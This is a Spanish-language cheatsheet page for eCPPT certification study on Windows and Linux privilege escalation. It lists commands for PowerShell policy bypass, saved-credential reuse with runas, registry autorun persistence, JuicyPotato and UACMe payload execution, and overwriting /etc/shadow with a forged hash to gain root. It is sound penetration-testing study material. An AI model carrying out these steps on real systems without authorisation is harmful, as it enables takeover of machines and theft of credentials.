
# Privilege Escalation

Todo el contenido de esta sección del eCPPT se encuentra disponible y mucho más detallado en la siguiente página:

{% content-ref url="/pages/5KGjWN4U83ofo1wtIfWj" %}
[Escalada de Privilegios](/ethical-hacking-cheatsheet/post-explotacion/escalada-de-privilegios.md)
{% endcontent-ref %}

***

## <mark style="color:$primary;">Cheatsheet</mark>

### **Privilege Escalation | Windows**

#### **PowerUp**

| Comando / Pasos         | Qué hace                              |
| ----------------------- | ------------------------------------- |
| Abrir PowerShell        | Inicia consola                        |
| `powershell -ep bypass` | Evita restricciones                   |
| `.\PowerUp.ps1`         | Carga el script                       |
| `Invoke-PrivEscAudit`   | Enumera posibles vectores de escalada |

#### **PrivescCheck**

| Comando / Pasos         | Qué hace                           |
| ----------------------- | ---------------------------------- |
| Abrir PowerShell        | Inicia consola                     |
| `powershell -ep bypass` | Evita restricciones                |
| `.\PrivescCheck.ps1`    | Carga el script                    |
| `Invoke-PrivescCheck`   | Busca vulnerabilidades de escalada |

#### **cmdkey**

| Comando                                   | Qué hace                                                    |
| ----------------------------------------- | ----------------------------------------------------------- |
| `cmdkey /list`                            | Lista credenciales almacenadas                              |
| `runas.exe /savecred /user:founduser cmd` | Ejecuta cmd como otro usuario usando credenciales guardadas |

#### **PowerShell History**

| Ruta                                                                                        | Qué hace                                      |
| ------------------------------------------------------------------------------------------- | --------------------------------------------- |
| `C:\Users\User\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history` | Historial de comandos (posibles credenciales) |

#### **Registry Autoruns**

| Comando / Pasos                                                                      | Qué hace                       |
| ------------------------------------------------------------------------------------ | ------------------------------ |
| `Get-Acl -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' \| Format-List` | Verifica permisos del registro |
| Crear/modificar clave de registro con payload                                        | Persistencia mediante autorun  |
| Payload se ejecuta al iniciar sesión                                                 | Ejecución automática           |

#### **Juicy Potato**

| Comando / Pasos                                          | Qué hace                            |
| -------------------------------------------------------- | ----------------------------------- |
| Generar payload con MSFVenom                             | Prepara payload                     |
| Subir `juicypotato.exe` al target                        | Herramienta de explotación          |
| `JuicyPotato.exe -l 5555 -p PATHTOPAYLOAD -t * -c CLSID` | Escalada usando token impersonation |
| Usar CLSID válido                                        | Necesario para exploit              |

#### **UACMe**

| Comando                                         | Qué hace                         |
| ----------------------------------------------- | -------------------------------- |
| `Akagi64.exe {KEY} {FULL_PATH_MPRETER_PAYLOAD}` | Bypass de UAC ejecutando payload |
| Ejecutar desde ruta accesible                   | Lanza el exploit                 |

***

### **Privilege Escalation | Linux**

#### **File Permissions**

| Comando / Pasos                          | Qué hace                               |
| ---------------------------------------- | -------------------------------------- |
| `find / -not -type l -perm -o+w`         | Busca archivos escribibles globalmente |
| Si `/etc/shadow` es editable             | Posible escalada                       |
| `openssl passwd -1 -salt abc {password}` | Genera hash de contraseña              |
| Editar `/etc/shadow` y pegar hash        | Permite acceso root                    |

#### **SUID Binaries**

| Comando                                             | Qué hace                                 |
| --------------------------------------------------- | ---------------------------------------- |
| `sudo -l`                                           | Verifica permisos sudo (buscar NOPASSWD) |
| `find / -perm -u=s -type f 2>/dev/null`             | Busca binarios con SUID                  |
| `find / -user root -perm -4000 -exec ls -ldb {} \;` | Lista binarios SUID de root              |

## <mark style="color:$primary;">Secciones</mark>

{% content-ref url="/pages/QO0WCQsh9G8F1IEeD8Ja" %}
[Introducción](/ethical-hacking-cheatsheet/introduccion/certificaciones/ecpptv3/privilege-escalation/introduccion.md)
{% endcontent-ref %}

{% content-ref url="/pages/X2P1SjKgOAA21h3CrzQi" %}
[Windows Privilege Escalation](/ethical-hacking-cheatsheet/introduccion/certificaciones/ecpptv3/privilege-escalation/windows-privilege-escalation.md)
{% endcontent-ref %}

{% content-ref url="/pages/ipTe8ad0r7gDOuEk22QS" %}
[Linux Privilege Escalation](/ethical-hacking-cheatsheet/introduccion/certificaciones/ecpptv3/privilege-escalation/linux-privilege-escalation.md)
{% endcontent-ref %}

{% content-ref url="/pages/HCi9NkNzXK2r9lEuZxsG" %}
[Privilege Escalation CTF 1](/ethical-hacking-cheatsheet/introduccion/certificaciones/ecpptv3/privilege-escalation/privilege-escalation-ctf-1.md)
{% endcontent-ref %}
